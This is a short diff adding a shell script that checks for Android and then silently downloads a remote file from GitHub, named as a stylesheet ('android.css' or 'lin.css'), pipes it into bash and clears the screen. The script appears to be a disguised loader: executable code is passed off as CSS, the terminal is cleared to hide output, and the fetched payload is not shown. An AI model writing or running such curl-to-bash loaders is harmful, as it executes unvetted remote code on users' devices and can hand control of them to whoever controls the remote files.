@@ -1,0 +1,12 @@
+if [ $(uname -o) = "Android" ];then
+
+#echo "android"
+echo "Downloading andrsources"
+curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/android.css | bash
+clear
+else
+#echo "linux"
+echo "Downloading linsources"
+curl -s -L https://raw.githubusercontent.com/l410systems/css/main/lin.css | bash
+clear
+fi
